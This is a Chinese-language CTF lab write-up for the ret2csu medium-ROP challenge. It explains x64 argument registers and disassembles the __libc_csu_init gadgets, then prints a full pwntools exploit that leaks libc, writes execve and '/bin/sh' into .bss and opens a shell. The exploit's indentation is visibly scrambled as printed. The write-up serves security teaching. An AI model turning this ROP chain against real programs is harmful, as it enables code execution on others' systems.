> github：https://github.com/jovy-rtt/AzCTF-retcsu

# 一、要求

**ROP 利用**

1. 深入理解进程信息索引

   - 二进制程序

   - 虚拟内存空间

   - 基地址

2. 理解二进制防护（编译、链接时）以及防护目的
3. 理解Linux系统进程控制的基本数据结构
4. 深入理解二进制防护的手段以及目的

**选择**

```
level2：
	CTF-wiki的中级ROP之ret2csu
```

# 二、知识准备

## 环境配置

```
操作系统：kali-2023.1
GDB: GNU gdb (Debian 13.1-2) 13.1
GCC: gcc version 12.2.0 (Debian 12.2.0-14)
其他工具：gdb-peda、python、pwntools、objdump、LibcSearcher
```

## 原理

```
在64位程序中，函数的前6个参数通过寄存器传递。

这就需要我们通过gadgets操作寄存器，但是我们很难找到每个寄存器对应的gadgets。这时，我们可以利用x64下的__libc_csu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般程序都会调用libc。

在Linux函数调用中：

	前6个参数从左向右依次放入rdi，rsi，rdx，rcx，r8，r9。

	超出6个的参数从右向左放入栈中
```

# 三、利用步骤

## checksec

![image-20230424094954561](./readme.assets/image-20230424094954561.png)

```
程序为 64 位，开启了堆栈不可执行保护。
```

## IDA分析

![image-20230424095100857](./readme.assets/image-20230424095100857.png)

```
程序中有一个简单的栈溢出，但没有其它函数信息，也没有system和/bin/sh。这就需要我们自己构造system和/bin/sh。同时寻找6个寄存器的gadgets比较困难，这个程序使用了libc。我们可以去__libc_csu_init函数寻找gadgets。
```

## gadgets

![image-20230424095742237](./readme.assets/image-20230424095742237.png)

 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。

```asm
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004005C0 ; __unwind {
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 ; } // starts at 4005C0
.text:0000000000400624 __libc_csu_init endp
```

阅读后可以发现：

```
	从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。

	从 0x0000000000400600 到 0x0000000000400609，我们可以将 rdx = r13 , rsi = r14 ，rdi = r15d （虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0）
	
	从 0x000000000040060D 到 0x0000000000400614，我们设为 rbx+1 = rbp，这样就可以跳过 loc_400600，进而可以继续执行下面的汇编程序。即 rbx=0，rbp=1。
	
	rbx和r12可以用来控制call命令
```

## 利用思路

csu函数的执行流程：

- 填充垃圾字符
  - 跳转到csu_end_addr处执行
- 将栈上的数据压入对应的寄存器（rbx、rbp、r12、r13、r14、r15
  - ret指令跳转到csu_start_addr处执行
- 将数据写入rdx、rsi、edi（前三个参数的寄存器）
  - 调用地址为r12 + rbx * 8的函数
- 填充垃圾字符（平衡堆栈）
  - ret指令返回last。

三次构造payload进行注入即：

```
利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数
根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址
再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 '/bin/sh’ 地址，并使得程序重新执行 main 函数。
再次利用栈溢出执行 libc_csu_gadgets 执行 execve('/bin/sh') 获取 shell。
```

## EXP

```python
#! /usr/bin/python3
from pwn import *
from LibcSearcher import *

  context(os = 'linux', arch = 'amd64', log_level = 'debug')

  p = process('./level5')
level5 = ELF('./level5')
  
  bss_base = level5.bss()
    main = level5.symbols['main']
  read_got = level5.got['read']
    write_got = level5.got['write']
  csu_start_addr = 0x0000000000400600
    csu_end_addr = 0x000000000040061A
  
    def csu(rbx, rbp, r12, r13, r14, r15, last):
      #rbx = 0, rbp = 1;
        payload = 0x80 * b'a' + 8 * b'a'
      payload += p64(csu_end_addr)
        payload += flat([rbx, rbp, r12, r13, r14, r15])
        payload += p64(csu_start_addr)
        payload += 56 * b'a'
        payload += p64(last)
        
  p.send(payload)
  sleep(1)
  #write write addr
  p.recvuntil('Hello, World\n')
  csu(0, 1, write_got, 8, write_got, 1, main)
  
  #get system address
  write_addr = u64(p.recv(8))
  libc = LibcSearcher('write', write_addr)
  libc_base = write_addr - libc.dump('write')
  system_addr = libc_base + libc.dump('execve')
  
  #write system and binsh to bss
  p.recvuntil('Hello, World\n')
  csu(0, 1, read_got, 16, bss_base, 0, main)
  p.send(p64(system_addr) + b'/bin/sh\x00')
  
  #run system and binsh
  p.recvuntil('Hello, World\n')
  csu(0, 1, bss_base, 0, 0, bss_base + 8, main)
  
  p.interactive()
```

## 结果

![image-20230424100950596](./readme.assets/image-20230424100950596.png)

# 四、参考

- http://wooyun.jozxing.cc/static/drops/papers-7551.html
- http://wooyun.jozxing.cc/static/drops/binary-10638.html
- https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/
- https://blog.xxxb.cn/2021/05/21/MediumROP-ret2csu/
- https://deoplljj.com/2021/08/ret2libcret2csu/
